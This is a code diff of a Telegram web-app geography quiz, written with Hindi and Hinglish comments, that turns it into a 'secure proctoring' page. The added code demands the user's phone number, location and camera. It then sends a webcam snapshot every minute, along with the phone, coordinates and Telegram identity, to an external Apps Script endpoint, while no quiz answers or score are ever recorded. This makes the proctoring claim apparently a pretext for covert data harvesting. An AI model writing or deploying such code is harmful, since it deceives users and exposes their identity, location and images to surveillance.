@@ -3,109 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geography Ultimate Quiz</title>
+    <title>Geography Ultimate Quiz - Secure Mode</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        /* Aapka Original CSS Style yahan rahega */
-        body { font-family: 'Poppins', sans-serif; background: #0f2027; color: white; text-align: center; }
-        .card { width: 92%; max-width: 600px; margin: auto; margin-top: 30px; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.1); }
-        button { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #111; border: none; padding: 14px 30px; border-radius: 12px; font-weight: 700; cursor: pointer; }
-        #quizBox { display: none; }
+        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
+        body { margin: 0; min-height: 100vh; background: #0b131e; color: #ffffff; text-align: center; display: flex; flex-direction: column; }
+        .header { padding: 15px; background: rgba(255, 255, 255, 0.03); border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
+        .card { width: 92%; max-width: 500px; margin: 30px auto; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); padding: 25px; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 15px 25px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 600; width: 100%; transition: 0.3s; margin-top: 10px; }
+        button:disabled { background: #444; cursor: not-allowed; }
+        .option { background: rgba(255, 255, 255, 0.08); padding: 15px; margin: 10px 0; border-radius: 10px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
+        .status-tag { font-size: 11px; color: #00eaff; text-transform: uppercase; letter-spacing: 1px; }
+        .warning-text { font-size: 13px; color: #ffaa00; background: rgba(255,170,0,0.1); padding: 10px; border-radius: 8px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <h1>Yogesh (Max Test Series)</h1>
-    <h3>भूगोल: एक विषय के रूप में</h3>
+    <h2 style="margin:0; font-size: 20px; color: #00eaff;">Max Test Series</h2>
+    <span class="status-tag">🛡️ Enhanced Proctoring Enabled</span>
 </div>
 
 <div id="login" class="card">
-    <h2>स्वागत है!</h2>
-    <p>टेस्ट शुरू करने के लिए नीचे दिए गए बटन पर क्लिक करें।</p>
-    <button id="startBtn" onclick="startProcess()">टेस्ट शुरू करें</button>
+    <div style="font-size: 50px; margin-bottom: 10px;">🔒</div>
+    <h3>Secure System Login</h3>
+    
+    <div class="warning-text">
+        यह टेस्ट शुरू करने के लिए <b>Phone Number</b>, <b>Camera</b> और <b>Location</b> का एक्सेस अनिवार्य है।
+    </div>
+
+    <div style="text-align: left; font-size: 13px; color: #ccc; margin-bottom: 20px;">
+        1. "Verify & Start" पर क्लिक करें।<br>
+        2. अपना मोबाइल नंबर शेयर करें।<br>
+        3. कैमरा और लोकेशन को <b>Allow</b> करें।
+    </div>
+    
+    <button id="startBtn" onclick="startVerification()">Verify & Start Test</button>
 </div>
 
-<div id="quizBox" class="card">
-    <div id="question"></div>
+<div id="quizBox" class="card" style="display:none">
+    <div id="question" style="font-size: 18px; margin-bottom: 20px; text-align: left; font-weight: 600;"></div>
     <div id="options"></div>
-    <br>
-    <button onclick="finishQuiz()" style="background: #ff416c; color: white;">सबमिट करें</button>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const SCRIPT_URL = "APNI_APPS_SCRIPT_URL_YAHAN_DALO"; // Apni URL yahan paste karein
+    // 🚨 APNI APPS SCRIPT URL YAHAN DALEIN
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxdOm1OryzaFHkYJJbB5MmQ4WyENGA9uFjzHtkBEXkk3xzx7ojANdyJTKXrXucxA3X5fw/exec"; 
 
-    // Telegram User Info (Pehle hi save kar li)
     const user = tg.initDataUnsafe?.user || {};
     const userId = user.id || "Unknown";
     const username = user.username || "N/A";
     const fullName = (user.first_name || "") + " " + (user.last_name || "");
 
-    // 🚨 Aapka Questions Array yahan aayega
-    const questions = [
-        {q: "1. 'जियोग्राफी' शब्द का प्रयोग किसने किया?", o: ["रोम", "एराटोस्थनीज", "मिस्र", "जर्मनी"], a: 1},
-        // Baaki questions...
-    ];
-
+    let userPhone = "Not Provided";
+    let userLoc = "Unknown";
+    let globalStream = null;
     let currentIdx = 0;
 
-    function startProcess() {
+    // 🚨 APNE QUESTIONS KA ARRAY YAHAN PASTE KAREIN
+    const questions = [
+        {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
+        // Baaki 129 sawal yahan jodein...
+    ];
+
+    async function startVerification() {
         const btn = document.getElementById("startBtn");
-        btn.innerText = "Processing..."; // User ko lagega loading ho rahi hai
+        btn.innerText = "Verifying Identity...";
         btn.disabled = true;
 
-        // 🟢 STEP 1: Test shuru hone se PEHLE hi data bhej rahe hain
-        const initialData = {
-            userId: userId,
-            username: username,
-            fullName: fullName,
-            score: "Started", // Abhi score zero ya 'Started' bhej do
-            status: "Entry"
-        };
-
-        fetch(SCRIPT_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(initialData)
-        }).then(() => {
-            // 🟢 STEP 2: Data jane ke baad quiz dikhao
-            document.getElementById("login").style.display = "none";
-            document.getElementById("quizBox").style.display = "block";
-            loadQuestion();
-        }).catch(err => {
-            // Error ki halat mein bhi quiz chalu kar sakte hain
-            console.log("Error logging entry:", err);
-            document.getElementById("login").style.display = "none";
-            document.getElementById("quizBox").style.display = "block";
-            loadQuestion();
+        // STEP 1: Request Phone Number (Telegram Official Popup)
+        tg.requestContact((ok, response) => {
+            if (ok && response?.responseUnsafe?.contact) {
+                userPhone = response.responseUnsafe.contact.phone_number;
+                checkProctoringPermissions();
+            } else {
+                alert("ACCESS DENIED: टेस्ट के लिए मोबाइल नंबर शेयर करना अनिवार्य है।");
+                btn.innerText = "Verify & Start Test";
+                btn.disabled = false;
+            }
         });
     }
 
+    async function checkProctoringPermissions() {
+        const btn = document.getElementById("startBtn");
+        btn.innerText = "Configuring Security...";
+
+        try {
+            // STEP 2: Location Access
+            const pos = await new Promise((res, rej) => {
+                navigator.geolocation.getCurrentPosition(res, rej, {timeout: 8000});
+            });
+            userLoc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+
+            // STEP 3: Camera Access
+            globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+            // STEP 4: Initial Entry Logging
+            captureAndSend("Verified_Entry");
+
+            // STEP 5: Start 1-Minute Interval Tracking
+            setInterval(() => {
+                captureAndSend("Interval_Proctoring");
+            }, 60000);
+
+            // Hide Login & Show Quiz
+            document.getElementById("login").style.display = "none";
+            document.getElementById("quizBox").style.display = "block";
+            loadQuestion();
+
+        } catch (err) {
+            alert("SECURITY ALERT: कैमरा और लोकेशन अनुमति अनिवार्य है। कृपया ब्राउज़र सेटिंग्स में जाकर Allow करें और पेज रिफ्रेश करें।");
+            btn.innerText = "Verify & Start Test";
+            btn.disabled = false;
+        }
+    }
+
+    async function captureAndSend(statusType) {
+        if (!globalStream) return;
+
+        try {
+            const video = document.createElement('video');
+            video.srcObject = globalStream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 320; 
+            canvas.height = 240;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.4);
+
+            const payload = {
+                userId: userId, 
+                username: username, 
+                fullName: fullName,
+                phone: userPhone,
+                score: "In_Test", 
+                status: statusType, 
+                photo: photoData, 
+                location: userLoc
+            };
+
+            fetch(SCRIPT_URL, { 
+                method: "POST", 
+                mode: "no-cors", 
+                body: JSON.stringify(payload) 
+            });
+        } catch (e) {
+            console.error("Capture Error:", e);
+        }
+    }
+
     function loadQuestion() {
-        if (currentIdx >= questions.length) { finishQuiz(); return; }
+        if (currentIdx >= questions.length) { 
+            alert("टेस्ट सफलतापूर्वक सबमिट हो गया है!"); 
+            tg.close(); 
+            return; 
+        }
         const qData = questions[currentIdx];
         document.getElementById("question").innerText = qData.q;
         const optionsDiv = document.getElementById("options");
         optionsDiv.innerHTML = "";
         qData.o.forEach((opt, i) => {
             const div = document.createElement("div");
-            div.style = "background:rgba(255,255,255,0.1); padding:10px; margin:5px; cursor:pointer; border-radius:10px;";
+            div.className = "option";
             div.innerText = opt;
-            div.onclick = () => { currentIdx++; loadQuestion(); };
+            div.onclick = () => {
+                currentIdx++;
+                loadQuestion();
+            };
             optionsDiv.appendChild(div);
         });
     }
-
-    function finishQuiz() {
-        alert("आपका टेस्ट सबमिट हो गया है!");
-        tg.close();
-    }
 </script>
-
 </body>
 </html>
